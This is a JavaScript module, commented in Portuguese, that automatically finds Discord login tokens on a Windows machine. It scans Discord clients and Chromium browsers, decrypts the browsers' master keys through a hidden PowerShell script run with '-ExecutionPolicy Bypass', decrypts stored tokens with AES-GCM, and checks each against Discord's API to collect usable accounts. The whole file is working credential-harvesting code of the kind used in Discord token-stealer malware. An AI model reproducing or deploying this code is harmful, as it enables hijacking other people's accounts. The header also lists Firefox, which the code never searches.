// src/services/tokenFinder.js - Busca automática de tokens do Discord
//
// Procura tokens do Discord nos seguintes locais:
// 1. Discord Desktop (app instalado)
// 2. Discord PTB (Public Test Build)
// 3. Discord Canary
// 4. Google Chrome
// 5. Microsoft Edge
// 6. Brave Browser
// 7. Opera / Opera GX
// 8. Vivaldi
// 9. Firefox
//
// Suporta dois formatos:
// - Tokens em texto puro (regex nos ficheiros .ldb/.log)
// - Tokens encriptados (prefixo dQw4w9WgXcQ:) desencriptados via DPAPI do Windows

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { execSync } = require('child_process');
const os = require('os');

// Padrão regex para tokens em texto puro
const PLAIN_TOKEN_PATTERNS = [
  /[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}/g,
  /mfa\.[\w-]{84,}/g,
];

// Padrão para tokens encriptados (Chromium DPAPI)
const ENCRYPTED_TOKEN_PATTERN = /dQw4w9WgXcQ:([^\s"',;}{)\]]+)/g;

/**
 * Retorna os caminhos onde o Discord/navegadores guardam dados.
 */
function getSearchPaths() {
  const appData = process.env.APPDATA || path.join(os.homedir(), 'AppData', 'Roaming');
  const localAppData = process.env.LOCALAPPDATA || path.join(os.homedir(), 'AppData', 'Local');

  return [
    // ===== Aplicações Discord =====
    {
      name: 'Discord',
      leveldb: path.join(appData, 'discord', 'Local Storage', 'leveldb'),
      localState: path.join(appData, 'discord', 'Local State'),
    },
    {
      name: 'Discord PTB',
      leveldb: path.join(appData, 'discordptb', 'Local Storage', 'leveldb'),
      localState: path.join(appData, 'discordptb', 'Local State'),
    },
    {
      name: 'Discord Canary',
      leveldb: path.join(appData, 'discordcanary', 'Local Storage', 'leveldb'),
      localState: path.join(appData, 'discordcanary', 'Local State'),
    },
    // ===== Navegadores (Chromium-based) =====
    {
      name: 'Google Chrome',
      leveldb: path.join(localAppData, 'Google', 'Chrome', 'User Data', 'Default', 'Local Storage', 'leveldb'),
      localState: path.join(localAppData, 'Google', 'Chrome', 'User Data', 'Local State'),
    },
    {
      name: 'Microsoft Edge',
      leveldb: path.join(localAppData, 'Microsoft', 'Edge', 'User Data', 'Default', 'Local Storage', 'leveldb'),
      localState: path.join(localAppData, 'Microsoft', 'Edge', 'User Data', 'Local State'),
    },
    {
      name: 'Brave',
      leveldb: path.join(localAppData, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Local Storage', 'leveldb'),
      localState: path.join(localAppData, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Local State'),
    },
    {
      name: 'Opera',
      leveldb: path.join(appData, 'Opera Software', 'Opera Stable', 'Local Storage', 'leveldb'),
      localState: path.join(appData, 'Opera Software', 'Opera Stable', 'Local State'),
    },
    {
      name: 'Opera GX',
      leveldb: path.join(appData, 'Opera Software', 'Opera GX Stable', 'Local Storage', 'leveldb'),
      localState: path.join(appData, 'Opera Software', 'Opera GX Stable', 'Local State'),
    },
    {
      name: 'Vivaldi',
      leveldb: path.join(localAppData, 'Vivaldi', 'User Data', 'Default', 'Local Storage', 'leveldb'),
      localState: path.join(localAppData, 'Vivaldi', 'User Data', 'Local State'),
    },
  ];
}

// ====================== DPAPI DECRYPTION (Windows) ======================

/**
 * Lê a chave mestre de encriptação do ficheiro "Local State" do Chromium.
 * A chave está encriptada com DPAPI do Windows.
 */
function getMasterKey(localStatePath) {
  if (!fs.existsSync(localStatePath)) return null;

  try {
    const localState = JSON.parse(fs.readFileSync(localStatePath, 'utf8'));
    const encryptedKeyB64 = localState?.os_crypt?.encrypted_key;

    if (!encryptedKeyB64) return null;

    // Base64 decode -> remove prefixo "DPAPI" (5 bytes)
    const encryptedKey = Buffer.from(encryptedKeyB64, 'base64');
    const dpapiBlob = encryptedKey.slice(5);

    // Desencriptar via DPAPI usando PowerShell
    return dpapiDecrypt(dpapiBlob);
  } catch (_) {
    return null;
  }
}

/**
 * Desencripta dados usando Windows DPAPI via PowerShell.
 * Usa CryptUnprotectData do Windows para desencriptar a chave mestre.
 */
function dpapiDecrypt(encryptedBuffer) {
  try {
    // Converte o buffer para base64 para passar ao PowerShell
    const b64 = encryptedBuffer.toString('base64');

    // Usa ficheiro temporário para evitar problemas com aspas no PowerShell
    const tmpScript = path.join(os.tmpdir(), `dpapi_${Date.now()}.ps1`);
    const psContent = [
      'Add-Type -AssemblyName "System.Security"',
      `$encrypted = [Convert]::FromBase64String("${b64}")`,
      '$decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($encrypted, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)',
      'Write-Output ([Convert]::ToBase64String($decrypted))',
    ].join('\r\n');

    fs.writeFileSync(tmpScript, psContent);

    const result = execSync(
      `powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "${tmpScript}"`,
      { encoding: 'utf8', timeout: 10000, windowsHide: true }
    ).trim();

    // Limpar ficheiro temporário
    try { fs.unlinkSync(tmpScript); } catch (_) {}

    return Buffer.from(result, 'base64');
  } catch (_) {
    return null;
  }
}

/**
 * Desencripta um token encriptado com AES-256-GCM usando a chave mestre.
 *
 * Formato do blob encriptado:
 * [v10/v11 (3 bytes)] [IV (12 bytes)] [ciphertext + tag]
 */
function decryptToken(encryptedTokenB64, masterKey) {
  try {
    const buf = Buffer.from(encryptedTokenB64, 'base64');

    // Os primeiros 3 bytes são a versão (v10 ou v11)
    const version = buf.slice(0, 3).toString();
    if (version !== 'v10' && version !== 'v11') return null;

    // IV: bytes 3-15 (12 bytes)
    const iv = buf.slice(3, 15);

    // Ciphertext + Auth Tag: bytes 15 até o final
    // O Auth Tag do AES-GCM são os últimos 16 bytes
    const ciphertextWithTag = buf.slice(15);
    const authTag = ciphertextWithTag.slice(ciphertextWithTag.length - 16);
    const ciphertext = ciphertextWithTag.slice(0, ciphertextWithTag.length - 16);

    // Desencripta com AES-256-GCM
    const decipher = crypto.createDecipheriv('aes-256-gcm', masterKey, iv);
    decipher.setAuthTag(authTag);

    let decrypted = decipher.update(ciphertext, null, 'utf8');
    decrypted += decipher.final('utf8');

    return decrypted;
  } catch (_) {
    return null;
  }
}

// ====================== TOKEN SEARCH ======================

/**
 * Procura tokens (em texto puro e encriptados) num diretório de LevelDB.
 */
function findTokensInDirectory(dirPath, masterKey) {
  const tokens = new Set();

  if (!fs.existsSync(dirPath)) return tokens;

  try {
    const files = fs.readdirSync(dirPath);

    for (const file of files) {
      if (!file.endsWith('.ldb') && !file.endsWith('.log')) continue;

      const filePath = path.join(dirPath, file);

      try {
        // Ler como binary para não perder dados
        const contentBuf = fs.readFileSync(filePath);
        const content = contentBuf.toString('utf8');

        // 1. Procurar tokens em texto puro
        for (const pattern of PLAIN_TOKEN_PATTERNS) {
          pattern.lastIndex = 0;
          let match;
          while ((match = pattern.exec(content)) !== null) {
            tokens.add(match[0]);
          }
        }

        // 2. Procurar tokens encriptados (se temos a masterKey)
        if (masterKey) {
          ENCRYPTED_TOKEN_PATTERN.lastIndex = 0;
          let match;
          while ((match = ENCRYPTED_TOKEN_PATTERN.exec(content)) !== null) {
            const encryptedB64 = match[1];
            try {
              const decrypted = decryptToken(encryptedB64, masterKey);
              if (decrypted && decrypted.length > 20) {
                tokens.add(decrypted);
              }
            } catch (_) {}
          }
        }
      } catch (_) {
        // Ficheiro bloqueado pelo processo - normal se o app estiver aberto
      }
    }
  } catch (_) {}

  return tokens;
}

/**
 * Procura tokens em todos os locais conhecidos.
 * Retorna um array de { source: string, token: string }.
 */
function findAllTokens() {
  const results = [];
  const seenTokens = new Set();
  const searchPaths = getSearchPaths();

  for (const location of searchPaths) {
    // Obter a chave mestre para desencriptar tokens (se disponível)
    let masterKey = null;
    if (location.localState) {
      masterKey = getMasterKey(location.localState);
    }

    const tokens = findTokensInDirectory(location.leveldb, masterKey);

    for (const token of tokens) {
      if (seenTokens.has(token)) continue;
      seenTokens.add(token);

      results.push({
        source: location.name,
        token,
        preview: maskToken(token),
      });
    }
  }

  return results;
}

/**
 * Mascara um token para exibição segura.
 */
function maskToken(token) {
  if (token.length <= 10) return '***';
  const start = token.substring(0, 6);
  const end = token.substring(token.length - 4);
  return `${start}${'*'.repeat(8)}${end}`;
}

/**
 * Valida se um token é funcional tentando consultar a API do Discord.
 * Retorna { valid: boolean, username?: string }
 */
async function validateToken(token) {
  const https = require('https');

  return new Promise((resolve) => {
    const options = {
      hostname: 'discord.com',
      path: '/api/v9/users/@me',
      method: 'GET',
      headers: {
        'Authorization': token,
        'Content-Type': 'application/json',
      },
    };

    const req = https.request(options, (res) => {
      let data = '';
      res.on('data', (chunk) => { data += chunk; });
      res.on('end', () => {
        if (res.statusCode === 200) {
          try {
            const user = JSON.parse(data);
            resolve({
              valid: true,
              username: user.username || 'Desconhecido',
              globalName: user.global_name || user.username,
              id: user.id,
            });
          } catch (_) {
            resolve({ valid: false });
          }
        } else {
          resolve({ valid: false });
        }
      });
    });

    req.on('error', () => resolve({ valid: false }));
    req.setTimeout(5000, () => {
      req.destroy();
      resolve({ valid: false });
    });
    req.end();
  });
}

/**
 * Busca e valida todos os tokens encontrados.
 * Retorna apenas os tokens válidos com informações do utilizador.
 */
async function findAndValidateTokens(onProgress) {
  const allTokens = findAllTokens();

  if (allTokens.length === 0) {
    return [];
  }

  const validTokens = [];
  // Deduplica por token real (o mesmo token pode estar em vários locais)
  const validatedSet = new Set();

  for (let i = 0; i < allTokens.length; i++) {
    const entry = allTokens[i];

    if (onProgress) {
      onProgress({
        current: i + 1,
        total: allTokens.length,
        source: entry.source,
        preview: entry.preview,
      });
    }

    if (validatedSet.has(entry.token)) continue;
    validatedSet.add(entry.token);

    const result = await validateToken(entry.token);

    if (result.valid) {
      validTokens.push({
        source: entry.source,
        token: entry.token,
        preview: entry.preview,
        username: result.username,
        globalName: result.globalName,
        userId: result.id,
      });
    }
  }

  return validTokens;
}

module.exports = {
  findAllTokens,
  validateToken,
  findAndValidateTokens,
  maskToken,
};
